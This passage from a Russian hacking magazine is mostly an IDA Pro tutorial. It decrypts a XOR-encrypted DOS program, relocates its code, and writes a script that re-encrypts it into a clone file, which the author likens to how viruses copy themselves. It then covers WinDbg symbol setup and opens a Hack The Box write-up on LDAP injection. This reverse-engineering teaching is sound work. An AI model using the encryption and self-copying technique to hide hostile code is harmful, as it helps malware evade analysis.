  seg000:010D ; ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  seg000:010E        db 7Eh, 0CDh, 62h, 76h, 0BAh, 56h, 0B4h, 3Fh, 12h, 2
  dup(1Bh)
  seg000:010E        db 18h, 5Bh, 57h, 20h, 18h, 5, 13h, 56h, 7Ah, 7Dh,
  53h
  seg000:010E seg000 ends


IDA Pro автоматически соз дала новое имя locret_1010D, которое ссы лается
на зашифрован ный блок кода. Попробуем преобразовать его в данные.
Для этого надо поставить курсор на стро ку 010D и дважды нажать D, чтобы
утвердительно отве тить на воп рос во всплывающем диалоге. Листинг примет
следующий вид:



  ...
  seg000:010D word_1010D      dw 7EC3h ; DATA XREF: start↑o
  seg000:010F                 db 0CDh ; =
  seg000:0110                 db  62h ; b
  seg000:0111                 db  76h ; v
  seg000:0112                 db 0BAh ; ¦
  seg000:0113                 db  56h ; V
  seg000:0114                 db 0B4h ; +
  seg000:0115                 db  3Fh ; ?
  seg000:0116                 db  12h
  seg000:0117                 db  1Bh
  seg000:0118                 db  1Bh
  seg000:0119                 db  18h
  seg000:011A                 db  5Bh ; [
  seg000:011B                 db  57h ; W
  seg000:011C                 db  20h
  seg000:011D                 db  18h
  seg000:011E                 db    5
  seg000:011F                 db  13h
  seg000:0120                 db  56h ; V
  seg000:0121                 db  7Ah ; z
  seg000:0122                 db  7Dh ; }
  seg000:0123                 db  53h ; S
  seg000:0123 seg000          ends


Но на что именно указывает word_1010D? Понять это позволит изу чение сле‐
дующего кода:



  seg000:0100 start       proc near
  seg000:0100             mov     si, offset word_1010D
  seg000:0103
  seg000:0103 loc_10103:          ; CODE XREF: start+B↓j
  seg000:0103             xor     byte ptr [si], 77h
  seg000:0106             inc     si
  seg000:0107             cmp     si, 124h
  seg000:010B             jbe     short loc_10103
  seg000:010B start       endp


После того как в регистр SI попада ет смещение, начинается цикл, который
представ ляет собой прос тейший рас шифровщик: значение в регистре SI ука‐
зывает на символ, команда XOR с помощью чис ла 0x77 расшифровывает
один байт (один ASCII‐символ). Напомню, в ассемблере запись шестнад‐
цатеричных чисел вида 77h. Пос ле этого инкрементируется значение регис‐
тра SI (указатель переводится на следующий символ) и получившееся зна‐
чение сравнивается с чис лом 0x124, которое равно обще му количеству сим‐
волов для расшифровки.
   Здесь следует остановиться и, прокрутив дизас семблированный лис тинг
вниз, обратить внимание на то, какое смещение максимальное. Видим:
это 0x123. Область зашифрованных данных может продол жаться до конца
программы, тем не менее это зна чение меньше, чем количес тво байтов
для расшифровки.
  Давай расширим сегмент подопытной прог раммы. Жмем Shift‐F7 (View →
Open subviews → Segments), откроется вкладка Program Segmentation. В кон‐
текстном меню единственного существующего сегмента seg000 выбираем
пункт Edit Segments (Ctrl‐E). В диалоге в поле ввода End address введи зна‐
чение побольше, например 0x10125. Подтверди свое намерение в появив‐
шемся диалоге.





                  Изменение атрибутов сегмента

Можешь полюбоваться на увеличившийся сегмент. Вернемся к изучению
кода. Если в результате сравнения значение в регистре SI меньше общего
количества байтов или равно ему, выполняется переход на метку loc_10103
и блок кода пов торяется для рас шифровки следующего байта. Отсюда можно
заключить, что word_1010D указывает на начало последовательности байтов
для расшифровки. Подведя к ней курсор, жмем N и можем дать ей осмыслен‐
ное имя, например BeginCrypt. А константу 124h можем сначала преобра‐
зовать в смещение (Ctrl‐O), а затем переименовать, например в EndCrypt.


Расшифровка
Непосредственное  дизас семблирование  зашифрованного  кода  невоз‐
можно — предварительно его необходимо рас шифровать. Большинство
дизассемблеров не могут модифицировать ана лизируемый текст на лету,
и до загрузки в дизассемблер исследуемый файл должен быть полностью
расшифрован.
  На практике, однако, это выглядит несколько иначе. Прежде чем рас‐
шифровывать, необ ходимо выяс нить алгоритм расшифровки, проанализи‐
ровав доступную часть файла. Затем нужно выйти из дизассемблера, тем
или иным способом рас шифровать «секретный» фрагмент, вновь загрузить
файл в дизассемблер (причем предыду щие резуль таты работы дизассембле‐
ра окажутся утерянными) и продолжить его анализ до тех пор, пока не встре‐
тится еще один зашифрованный фрагмент. Теперь цикл «выход из дизассем‐
блера — расшифровка — загрузка — анализ» повторя ется вновь.
  Достоинство IDA заключа ется в том, что она позволя ет выполнить ту же
задачу значительно мень шими усилиями, никуда не выходя из дизас сембле‐
ра. Это достигается за счет того, что в IDA есть механизм виртуальной
памяти. Если не вдаваться в технические тонкости, можно упрощенно изоб‐
разить IDA в виде прозрачной вир туальной машины, которая оперирует
с физической памятью компьютера. Для модификации ячеек памяти необ‐
ходимо знать их адрес.
  Слева каждой строки ука зывается имя сегмента и его смещение, нап‐
ример seg000:0103. Одна ко нам нужно другое значение. Установив тексто‐
вый курсор на нужную строку, смотри на нижнюю часть текущей вкладки
(полагаю, у тебя это IDA View‐A).





                   Фактический номер стро ки

При переме щении курсора соответс твующее смещение тоже меняется (на
рисунке выше оно обведено рамочкой). С его помощью можно обратиться
к любой ячейке сегмента. Для чтения и модификации ячеек предусмотре ны
функции Byte и PatchByte соот ветственно. Их вызов может выглядеть, нап‐
ример, так: a=Byte(0x01010D) читает ячейку, расположенную по смещению
0x01010D; PatchByte(0x01010D,0x27) присваивает значение 0x27 ячейке
памяти, расположен ной по смещению 0x01010D. Как сле дует из названия
функций, они манипулиру ют ячейками размером в один байт.
  Знания языка C и этих двух функций вполне достаточно для написания
скрипта‐расшифровщика.
  Реализация IDA‐С не полностью придерживается стандарта, в частности
IDA не позволяет разработчику задавать тип переменной и определяет его
автоматически по ее первому использованию, а объявление осуществля ется
клю чевым словом auto. Нап ример, auto MyVar, s0 объявляет две перемен‐
ные — MyVar и s0.
  Для создания скрипта необходимо нажать Shift‐F2 или выбрать в меню File
пункт Script Command. В результате откро ется окно Execute script. Большую
его часть занимают список скриптов и поле ввода для редактирования выб‐
ранного скрипта.
  Дополнительно внизу окна находятся ниспадающий список для выбора
используемого языка (IDC или Python), ниспадающий список для указания
размера табуляции и четыре кнопки: Run (выполнить скрипт), Export (экспор‐
тировать скрипт в файл), Import (заг рузить скрипт из файла) и Save (сохранить
скрипт в базу данных про екта).
  После первого открытия окна в списке скриптов по умолчанию выбран
скрипт Default snippet. В качестве его тела введем такой код:


auto a, x;
for (a = 0x01010D; a <= 0x010123; a++) {
  x = Byte(a);
  x = (x ^ 0x77);
  PatchByte(a, x);
  Message(x);
}





                   Встроенный редактор скриптов

Как было показано выше, алго ритм рас шифровщика сводится к последова‐
тельному пре образованию каждой ячейки зашифрованного фрагмента опе‐
рацией XOR 0x77:



  seg000:0103         xor     byte ptr [si], 77h


Сам же зашифрованный фрагмент начина ется с адреса 0x01010D и продол‐
жается вплоть до 0x010123.
  В конце командой Message отправляем модифицированный символ
в область вывода IDA.
   Чтобы запустить скрипт на выполнение, дос таточно нажать кнопку Run.
Если при вводе скрипта не было опечаток, лис тинг примет следующий вид:



  ...
  seg000:010D BeginCrypt dw 9B4h ; DATA XREF: start↑o
  seg000:010F            db 0BAh ; ¦
  seg000:0110            db  15h
  seg000:0111            db    1
  seg000:0112            db 0CDh ; =
  seg000:0113            db  21h ; !
  seg000:0114            db 0C3h ; +
  seg000:0115            db  48h ; H
  seg000:0116            db  65h ; e
  seg000:0117            db  6Ch ; l
  seg000:0118            db  6Ch ; l
  seg000:0119            db  6Fh ; o
  seg000:011A            db  2Ch ; ,
  seg000:011B            db  20h
  seg000:011C            db  57h ; W
  seg000:011D            db  6Fh ; o
  seg000:011E            db  72h ; r
  seg000:011F            db  64h ; d
  seg000:0120            db  21h ; !
  seg000:0121            db  0Dh
  seg000:0122            db  0Ah
  seg000:0123            db  24h ; $
  seg000:0124 EndCrypt   db ?    ; DATA XREF: start+7↑o
  seg000:0124 seg000     ends
  seg000:0124
  seg000:0124
  seg000:0124            end start


А в окне вывода появится надпись



  ґ єН!ГHello, Word!
  $


Возможные ошибки: несоб людение регистра символов (IDA к этому чувс тви‐
тельна), синтаксические ошибки, неверно заданные адре са границ модифи‐
цируемого блока. В случае ошибки необ ходимо подвести курсор к строке
seg000:010D, нажать клавишу U (для удаления результатов предыдущего
дизассемблирования зашифрованного фрагмента) и затем C (для повторно‐
го дизассемблирования расшифрованного кода).
  Символы перед фразой «Hello, World!» не выглядят читаемыми; скорее
всего, это не ASCII, а исполняемый код. Поставим курсор на строку seg000:
010D, жмем C («Преобразовать в инструкцию»). В результате листинг будет
выглядеть так:



  ...
  seg000:010D BeginCrypt:     ; DATA XREF: start↑o
  seg000:010D             mov     ah, 9
  seg000:010F             mov     dx, 115h
  seg000:0112             int     21h      ; DOS ‐ PRINT STRING
  seg000:0112                 ; DS:DX → string terminated by "$"
  seg000:0114             retn
  seg000:0114 ; ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  seg000:0115             db  48h ; H
  seg000:0116             db  65h ; e
  seg000:0117             db  6Ch ; l
  seg000:0118             db  6Ch ; l
  seg000:0119             db  6Fh ; o
  seg000:011A             db  2Ch ; ,
  seg000:011B             db  20h
  seg000:011C             db  57h ; W
  seg000:011D             db  6Fh ; o
  seg000:011E             db  72h ; r
  seg000:011F             db  64h ; d
  seg000:0120             db  21h ; !
  seg000:0121             db  0Dh
  seg000:0122             db  0Ah
  seg000:0123             db  24h ; $
  seg000:0124 EndCrypt    db ?              ; DATA XREF: start+7↑o
  seg000:0124 seg000      ends
  seg000:0124
  seg000:0124
  seg000:0124             end start


Цепочку сим волов, расположенную начиная с адреса seg000:0115, можно
преобразовать в удобочитаемый вид, если навести на нее курсор и нажать A.
Еще можно преобразовать константу 115h в стро ке 010F в сме щение. Теперь
экран дизассембле ра будет выглядеть так:



  ...
  seg000:010D BeginCrypt:             ; DATA XREF: start↑o
  seg000:010D             mov     ah, 9
  seg000:010F             mov     dx, offset aHelloWord ; "Hello,
  Word!\r\n$"
  seg000:0112             int     21h ; DOS ‐ PRINT STRING
  seg000:0112                         ; DS:DX → string terminated by "$"
  seg000:0114             retn
  seg000:0114 ; ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  seg000:0115 aHelloWord  db 'Hello, Word!',0Dh,0Ah,'$' ; DATA XREF:
  seg000:010F↑o
  seg000:0124 EndCrypt    db ?        ; DATA XREF: start+7↑o
  seg000:0124 seg000      ends
  seg000:0124
  seg000:0124
  seg000:0124             end start


Команда MOV  AH,  9 в стро ке seg000:010D подготавливает регистр AH
перед вызовом прерыва ния 0x21. Она выбирает функцию вывода строки
на экран, а ее смещение следующей командой заносится в регистр DX. Ины‐
ми  словами,  для  успешного  ассемблирования  лис тинга  необходимо
заменить константу 0x115 соот ветствующим смещением.
  Но ведь выводимая строка на этапе ассемблирования (до перемещения
кода) расположена совсем в дру гом мес те! Одно из возможных решений
этой проблемы — создать новый сегмент и затем скопировать в него рас‐
шифрованный код. Это будет аналогом перемещения кода работающей
программы.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  ФУНДАМЕНТАЛЬНЫЕ
  ОСНОВЫ ХАКЕРСТВА
          МАСТЕР‐КЛАСС ПО АНАЛИЗУ ИСПОЛНЯЕМЫХ
                          ФАЙЛОВ В IDA PRO





Соз дание сегмента
Для создания нового сегмента надо открыть вкладку Segments (Shift‐F7)
и нажать Insert. Появится вот такое окно.





                    Создание нового сегмента

Базовый адрес сегмента может быть любым, если при этом не перекрыва‐
ются сегменты seg000 и MySeg; начальный адрес сегмента задается так, что‐
бы смещение первого байта было равно 0x100; раз мер нового сегмента сде‐
лаем таким же, как seg000. Не забудь выб рать тип создаваемого сегмента:
16‐битный сегмент.
  Далее будем двигаться поэтапно. Сначала скопиру ем команды для вывода
символов в консоль. Начнем брать байты со смещения 10D сегмента seg000,
а вставлять — с самого начала сегмента MySeg. Это можно сделать скриптом
следующего содержания:


auto a, x;
for (a = 0x0; a < 0x8; a++) {
  x = Byte(0x1010D+a);
  PatchByte(0x20100+a,x);
}

Для его вво да необ ходимо вновь нажать комбинацию клавиш Shift‐F2. Соз‐
дать еще один скрипт можно нажатием Insert. После выполнения экран дизас‐
семблера будет выглядеть так (показано только начало сегмента MySeg):



  MySeg:0100 ; Segment type: Regular
  MySeg:0100 MySeg           segment byte public '' use16
  MySeg:0100                 assume cs:MySeg
  MySeg:0100                 ;org 100h
  MySeg:0100                 assume es:nothing, ss:nothing, ds:nothing,
  fs:nothing, gs:nothing
  MySeg:0100                 db 0B4h ; +
  MySeg:0101                 db    9
  MySeg:0102                 db 0BAh ; ¦
  MySeg:0103                 db  15h
  MySeg:0104                 db    1
  MySeg:0105                 db 0CDh ; =
  MySeg:0106                 db  21h ; !
  MySeg:0107                 db 0C3h ; +
  MySeg:0108                 db    ? ;


Надо преобразовать данные в инструкции: пос тавить курсор на строку My‐
Seg:0100 и нажать C. Листинг при мет ожидаемый вид:



  MySeg:0100                 mov     ah, 9
  MySeg:0102                 mov     dx, 115h
  MySeg:0105                 int     21h             ; DOS ‐ PRINT STRING
  MySeg:0105                                         ; DS:DX → string ter‐
  minated by "$"
  MySeg:0107                 retn


Чтобы программа‐клон вела себя немного не так, как ее родитель, добавим
ожидание ввода символа. Для этого надо поставить курсор на команду retn
и выбрать Edit → Patch program → Assemble...
  Введи XOR AX, AX, нажми Enter. Затем INT 16h, снова Enter. Последняя
инструкция — RET, Enter и Esc для закрытия диало га.





                       Замена инструкции

Теперь с помощью следующего скрипта скопиру ем байты, составля ющие
текст «Hello, World!»:


auto a, x, i;
i = 0;
for (a = 0x0115; a < 0x124; a++) {
  x = Byte(0x10000+a);
  PatchByte(0x2010C+i,x);
  i++;
}

Поставив курсор на строку MySeg:010C, нажима ем A и преобразуем цепочку
символов в удобочитаемый вид. В строке MySeg:0102 надо изме нить кон‐
станту 115h на фактичес кое значение, по которо му рас положена фраза
для вывода: MySeg:010C. Для это го ставь курсор на указанную строку и откры‐
вай диалог Assemble Instruction (Edit → Patch program → Assemble...) и вводи
MOV DX, 10Ch.
   Теперь надо преобра зовать константу 10Ch в смещение, а последователь‐
ность символов, расположенную по нему, обратить к светскому виду. Как это
делать, ты уже знаешь. Напос ледок рекомендую про извести косметическую
чистку — уменьшить размер сегмента до необходимого. Чтобы удалить адре‐
са, оставшиеся при уменьшении размеров сегмента за его концом, поставь
флажок Disable Address в окне свойств сег мента.
   Казалось бы, можно уже начать ассемблирование, однако не стоит спе‐
шить! У нас в программе есть три смещения, которые являются указателями.
В дизассемблированном лис тинге они выглядят прекрасно:
 1. mov si, offset BeginCrypt в сег менте seg000;
 2. cmp si, offset EndCrypt в сег менте seg000;
 3. mov dx, offset aHelloWord_0 в сег менте MySeg.

Между тем после ассемблирова ния символьные имена будут заменены чис‐
ловыми константами. Будут ли в таком случае в результирующей программе
эти смещения указывать на те же вещи, что в исходной? Давай еще раз про‐
анализируем наш  листинг. Первое смещение,  BeginCrypt,  указывает
на строку seg000:010D. По сути, весь предыдущий код будет скопирован,
поэтому ее значение менять не нужно. Второе смещение, EndCrypt, указыва‐
ющее на конец сегмента, должно увеличиться на четыре байта, так как мы
добавили две инструкции:



  seg000:0114             xor     ax, ax
  seg000:0116             int     16h


Чтобы подсчитать их размер, дос таточно из следующего за ними смещения
вычесть их начальное: 118h – 114h = 4h байта. В результате EndCrypt должно
указывать на 124h + 4h = 128h. Уста нови курсор на строку seg000:0107,
вызови окно ассемблера и замени инс трукцию в ней на cmp si, 128h.
   Третье сме щение, aHelloWord_0, в исходной программе равно 10Ch.
Подумаем, как дол жен измениться адрес. Если aHelloWord_0 находится
в сегменте MySeg, то нам прос то нужно при бавить к име юще муся смещению
размер расшифровщика в сег менте seg000. Его можно посчитать как раз‐
ность начального смещения зашифрованного блока и начального адреса:
0x010D – 0x0100 = 0xD байт.
  В итоге сме щение aHelloWord_0 должно ука зывать на 0x10C + 0xD =
0x119. Изменим код: уста новив курсор на строку MySeg:0102, с помощью
встроенного ассемблера модифициру ем ее содержимое на mov dx, 119h.
  В результате пол ный листинг выглядит следующим образом:



  seg000:0100 ; Segment type: Pure code
  seg000:0100 seg000          segment byte public 'CODE' use16
  seg000:0100                 assume cs:seg000
  seg000:0100                 org 100h
  seg000:0100                 assume es:nothing, ss:nothing, ds:seg000,
  fs:nothing, gs:nothing
  seg000:0100
  seg000:0100 ; =========== S U B R O U T I N E ================
  seg000:0100
  seg000:0100
  seg000:0100                 public start
  seg000:0100 start           proc near
  seg000:0100                 mov     si, offset BeginCrypt
  seg000:0103
  seg000:0103 loc_10103:                              ; CODE XREF:
  start+Bj
  seg000:0103                 xor     byte ptr [si], 77h
  seg000:0106                 inc     si
  seg000:0107                 cmp     si, 128h
  seg000:010B                 jbe     short loc_10103
  seg000:010B start           endp
  seg000:010B
  seg000:010D
  seg000:010D BeginCrypt:                             ; DATA XREF: starto
  seg000:010D                 mov     ah, 9
  seg000:010F                 mov     dx, offset aHelloWord ; "Hello,
  Word!\r\n$"
  seg000:0112                 int     21h             ; DOS ‐ PRINT STRING
  seg000:0112                                         ; DS:DX → string
  terminated by "$"
  seg000:0114                 retn
  seg000:0114 ; ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  seg000:0115 aHelloWord      db 'Hello, Word!',0Dh,0Ah,'$' ; DATA XREF:
  seg000:010Fo
  seg000:0124 EndCrypt        db ?
  seg000:0124 seg000          ends
  seg000:0124
  MySeg:0100 ; ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  MySeg:0100
  ; ===========================================================
  MySeg:0100
  MySeg:0100 ; Segment type: Regular
  MySeg:0100 MySeg           segment byte public '' use16
  MySeg:0100                 assume cs:MySeg
  MySeg:0100                 ;org 100h
  MySeg:0100                 assume es:nothing, ss:nothing, ds:nothing,
  fs:nothing, gs:nothing
  MySeg:0100                 mov     ah, 9
  MySeg:0102                 mov     dx, 119h
  MySeg:0105                 int     21h             ; DOS ‐ PRINT STRING
  MySeg:0105                                         ; DS:DX → string ter‐
  minated by "$"
  MySeg:0107                 xor     ax, ax
  MySeg:0109                 int     16h             ; KEYBOARD ‐ READ
  CHAR FROM BUFFER, WAIT IF EMPTY
  MySeg:0109                                         ; Return: AH = scan
  code, AL = character
  MySeg:010B                 retn
  MySeg:010B ; ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
  MySeg:010C aHelloWord_0    db 'Hello, Word!',0Dh,0Ah,'$'
  MySeg:011B                 db    ? ;
  MySeg:011B MySeg           ends
  MySeg:011B
  MySeg:011B
  MySeg:011B                 end start



Соз дание кло на
Полученный листинг удо бен для ана лиза, но все еще не готов к ассембли‐
рованию хотя бы потому, что никакой ассемблер не в состоянии зашиф‐
ровать тре буемый код. Конечно, эту операцию можно выполнить вручную
после компиляции, но то же можно про делать, не выходя из IDA и не прибегая
к помощи стороннего инстру ментария.
  Для решения этой задачи напишем скрипт, авто матически выполняющий
копирование и шифрование необ ходимых час тей прог раммы:


auto a, f, x;
// Открывается файл crypt01.com для записи в двоичном режиме
f = fopen("crypt01.com", "wb");
// Копируется расшифровщик
for (a = 0x10100; a < 0x1010D; a++) {
  x = Byte(a);
  fputc(x, f);
}
// Копируется и на лету шифруется весь сегмент MySeg
for (a = SegStart(0x20100); a != SegEnd(0x20100); a++) {
  x = Byte(a);
  x = (x ^ 0x77);
  fputc(x, f);
}
// Файл закрывается
fclose(f);

Подобный механизм копирования своего тела во внешний файл использует‐
ся подавляющим большинством вирусов.


Ито ги
Выпол нение скрипта приведет к созданию фай ла crypt01.com, запустив
который можно убедить ся в его работоспособ ности — он выводит строку
на экран и, дождавшись нажатия любой клавиши, завершает работу.





                    Кло нированное приложение

Огромным преимуществом такого подхода является сквоз ная компиляция
файла, то есть дизассемблированный листинг в действительности не ассем‐
блировался! Вместо этого из виртуальной памяти байт за байтом читалось
оригинальное содержимое, которое за исклю чением модифицированных
строк идентично исходному файлу. Напротив, повторное ассемблирование
практически никогда не позволяет добить ся полного сходс тва с дизас сем‐
блируемым файлом.


ДИЗАССЕМБЛЕР И ОТЛАДЧИК В СВЯЗКЕ
Дизассемблер, вклю ченный в отладчик, обычно слишком примитивен и не
может похвастаться богатыми возможностями. Во всяком слу чае, дизассем‐
блер, встроенный в WinDbg, недалеко ушел от DUMPBIN, с недос татками
которого мы уже сталкивались. Нас колько же понятнее становится код, если
его загрузить в IDA!
  Чем же тогда ценен отладчик? Дело в том, что дизассемблер из‐за своей
статичности име ет ряд ограничений. Во‐первых, исследователю приходится
выпол нять программу на «эмуляторе» процессора, «зашитом» в его собс‐
твенной голове, следовательно, необходимо знать и назначение всех команд
процессора, и всех структур операционной сис темы (включая недоку мен‐
тированные).
   Во‐вторых, начать анализ с произвольного места программы не так‐то
просто — тре буется знать содержимое регистров и ячеек памяти на текущий
момент, а как их узнать? С регистра ми и локаль ными переменными еще не
так плохо — достаточ но покрутить экран дизассемблера вверх и посмотреть,
какие значения им прис ваиваются. Но этот фокус не прой дет с глобальными
переменными, модифицировать которые может кто угодно и когда угодно.
Вот бы установить точ ку останова... но какая же в дизас сембле ре может быть
точка останова?
   В‐третьих, дизассемблирова ние вынуждает реконс труировать алгоритм
каждой функции, в то время как отладка поз воляет рас сматривать ее
как «черный ящик» со входом и выходом. Допустим, имеется у нас функция,
которая расшифровывает основной модуль прог раммы. В дизассемблере
нам придется сначала разобраться в алгоритме шифрования (что может ока‐
заться совсем не прос то), затем переложить эту функцию на язык IDA‐С,
отладить ее, запустить расшифровщик... В отладчи ке же можно поручить
выпол нение этой функции процессору, не вни кая в то, как она работает, и,
дождавшись ее завершения, продолжить анализ уже расшифрованного
модуля программы.
  Можно перечислять бесконечно, но и без того ясно, что отладчик отнюдь
не конкурент дизассемблеру, а, напротив, партнер. Опытные хакеры всегда
используют эти инструменты в паре. Алгоритм реконструируется в дизассем‐
блере, а все непонятные моменты оперативно уточняются прогоном прог‐
раммы под отладчиком.
  При этом возникает естественное желание видеть в отладчике все те сим‐
вольные имена, которые были внесены в дизассемблерный листинг. И IDA Pro
предоставляет два способа это сделать! Рас смот рим оба.


Спо соб 1
Вернемся в Windows 10 и загрузим в IDA Pro файл first.exe (или ранее соз‐
данный «Идой» проект). Выберем в меню File подменю Produce ﬁle, а в нем —
пункт Create MAP ﬁle. На экра не появится окно с зап росом имени файла (вве‐
дем, например, first.map), а затем откроется модальный диалог, уточ‐
няющий, какие имена стоит включать в map‐файл. Нажмем Enter, чтобы оста‐
вить все галочки в состоянии по умолчанию.
  Мгновение спустя на дис ке обра зуется файл first.map, содержащий всю
необходимую отладочную информа цию в map‐формате Borland. Отладчик
WinDbg не поддерживает такой формат, поэтому перед его использованием
файл необходимо конвертировать в формат DBG — отладочный формат
Microsoft.
   Конвертировать можно с помощью утилиты map2dbg, свободно рас‐
пространяемой вместе с исходными кодами. Запус кать ее нужно из коман‐
дной строки. В один каталог с ней кладем map‐файл и соответствующий .exe.
Затем в нашем случае выполняем команду map2dbg first.exe.
  В результате утилита выведет число преобра зованных символов, а в
текущей папке будет создан новый файл с расширением dbg. Теперь можно
загрузить first.exe в WinDbg. При этом, если first.dbg находится в том же
каталоге, файл подхватится автоматически и будет скопирован в системную
папку C:\ProgramData\dbg\sym\first.dbg\ для дальнейшего исследования
экзешника.
  Сейчас в WinDbg надо выполнить команду .reload  /f. Она заставит
отладчик перезагрузить информа цию из модулей. Затем можешь выполнить
lm, чтобы увидеть список загруженных модулей. Модуль ﬁrst будет отмечен
как codeview symbols, иначе было бы deferred:



  00400000 0041d000   first    C (codeview symbols)
  C:\ProgramData\Dbg\sym\first.dbg\5D5D59DE1d000\first.dbg


Исполнение команды x first!* выведет все символы в файле first.exe
(показана только малая часть списка):



  ...
  004028c4          first!std::_String_const_iterator,std::allocator
  >::_String_const_iterator,std::allocator > =
  00402913          first!std::basic_streambuf >::_Xsgetn_s =
  0040298e          first!std::basic_streambuf >::xsputn =
  00402a57          first!std::basic_filebuf >::_Init =
  00402a9e          first!std::basic_string,std::allocator
  >::basic_string,std::allocator > =
  00402adb          first!std::_Fgetc =
  00402af6          first!std::_Fputc =
  00402b12          first!std::_Ungetc =
  00402b30          first!std::basic_filebuf >::sync =
  00402b5b          first!std::basic_filebuf >::pbackfail =
  00402bc5          first!std::basic_filebuf >::underflow =
  00402c29          first!std::basic_filebuf >::setbuf =
  00402c70          first!std::basic_string,std::allocator >::begin =
  00402c90          first!std::_Locinfo::~_Locinfo =
  ...


Посмотрим содержимое системной переменной:



  0:000> da first!aSouthAfrica
  00415500  "south‐africa"



Спо соб 2
Во втором способе отладчик и дизассемблер меняются местами, то есть
дизассемблер будет использовать функции отладчика. Первое, что необ‐
ходимо отме тить: бесплатная версия IDA не поз воляет отлаживать прог‐
раммы. Второе замеча ние не менее важное: в пути к отлаживаемой прог‐
рамме не должно быть символов кириллицы.


           WARNING

                      У бесплатной версии IDA Pro есть и другие недос‐
                           татки: некоррек тное создание выходных файлов
                            (в том числе map‐файла), некорректное постро‐
                      ение диаграммы и прочие пока не затронутые
                     нами вещи.


Теперь можно подключить WinDbg к IDA. Для этого надо открыть конфигура‐
ционный файл ida.cfg, находящийся в каталоге С:\Program Files\IDA 7.
0\cfg\. Проматываем его содержимое до такой строки:


//DBGTOOLS = "C:\\Program Files\\Debugging Tools for Windows (x86)\\";

Ниже или вместо нее вста вить путь к инстру ментам отладки WinDbg. В моем
случае:


DBGTOOLS = "C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64\\";

Отсюда вытекает третья мудрость: в случае с IDA 7.0 и новее, даже если при‐
ложение дизассемблируется и отлажива ется в 32‐битной разновидности IDA,
путь надо указывать к 64‐битной WinDbg. Иначе при запуске отладки тебя
ждет сообщение об ошибке.
  Следующим шагом надо запус тить IDA, выб рать WinDbg из ниспадающего
списка на панели инстру ментов  и, нажав F9, запустить отладку. Только
отладка приложения first.exe закончится, не успев начаться. Нужно сде‐
лать так, чтобы на точке входа программа замерла. Для этого надо выз вать
диалоговое окно Debugger setup (пункт Debugger options в меню Debugger).





                     Парамет ры отладчика

Нашу задачу призвана решить область Events. Здесь можно выбрать, на каких
событиях мы хотим под вешивать прог рамму. Поставим третий флажок Sus‐
pend on process entry point, в результате чего выполнение проги приоста‐
новится на стартовом коде.





      Выполнение программы было при остановлено на точке входа

Знакомые места? Еще бы! Обра ти внимание: программа оперирует регис‐
трами процессорной архитектуры x86‐64: RCX, RDX, RCI и так далее. Ядро
Windows 10 экспортиру ет 1595 символов, учитывая все установленные
обновления опе рационной системы на моем компь ютере.
   Это можно проверить, дважды щелкнув на модуле kernel32.dll в окне
Modules во время отладки проги «Идой». Откроется дополнительная вкладка
Module: KERNEL32.DLL. Ее можно отцепить и перетащить в любое место.
На нижней части рамки окна отображается общее количество символов,
экспортируемых данным модулем.
  Подклю чение WinDbg к IDA позволяет «Иде» использовать символьную
информацию модулей с пуб личного сервера Microsoft. Для этого можно соз‐
дать переменную окружения или определить директорию непосредственно
из IDA без ее перезапус ка. Пойдем второй, более короткой дорогой, а соз‐
дать переменную окружения ты можешь на досуге. В командную строку IDA (в
нижней части окна рядом с кнопкой WINDBG) введи:



  .sympath srv*c:\debugSymbols*http://msdl.microsoft.com/download/symbols


После этого перезагрузи символы командой .reload /f. Чис ло экспортиру‐
емых модулем kernel32.dll символов стало 5568.
   Теперь сим вольные имена не только отобража ются на экране, что упро‐
щает понимание кода, — на любое из них можно быстро и с комфортом уста‐
новить точку останова (ска жем, bp GetProcAddress), и отладчик поймет, что
от него хотят! Нет больше нуж ды держать в памяти эти трудно запоминаемые
шестнадцатеричные адреса!


ЗАКЛЮЧЕНИЕ
IDA — очень удобный инстру мент для модификации файлов, исходные тексты
которых утеряны или отсутству ют. Это практически единственный дизассем‐
блер, способный анализировать зашифрованные программы, не прибегая
к сторонним средствам. Ну и конечно, IDA обла дает развитым пользователь‐
ским интерфейсом и удобной системой навига ции по исследуемому тексту.
В результате с таким инстру ментом в руках ты можешь справиться с любой
мыслимой и немыслимой задачей... если, конечно, владеешь язы ком скрип‐
тов, что и подтвер дили приведенные выше примеры.


        WWW

                    А вот архив с материалами к статье. Также я буду
                      выкладывать сопутс твующий статьям материал,
                          тулзы и другой стафф на своем сайте в разделе
                       «Хакерство».
ВЗЛОМ

 НЕПРАВИЛЬНЫЙ
  CTF





       ОДНОРАЗОВЫЕ ПАРОЛИ,
      БУЙСТВО LDAP‐ИНЪЕКЦИЙ
     И ТРЮКИ C АРХИВАТОРОМ 7Z




Сегодня мы пройдем виртуаль ную машину
CTF с Hack The Box. В контексте этой статьи
аббревиатура CTF будет расшифровывать‐
ся как Compressed Token Format, а не Cap‐
ture the Flag, а сама машина пох васта ется             snovvcrash                                                                                        Безопасник, временами
уязвимым к разному типу LDAP‐инъекций        криптоана(рхист)литик,питонщик, местами по
веб‐приложением,       использованием       необходимостиадминистратор.системный
генератора одноразо вых паролей stoken        snovvcrash@protonmail.ch
в  качестве  механизма  аутентифика ции
на сервере, а также небрежно написан ным
скриптом на Bash, с помощью которого мы
обманем архиватор 7z и получим root.





                        HTB — CTF

CTF — просто идеальная машина для сос тавления райтапа: ее решение пря‐
молинейно, нет множества развилок на пути, которые ведут в никуда и меша‐
ют следить за повествованием. Так что мне не при дется выкручиваться и при‐
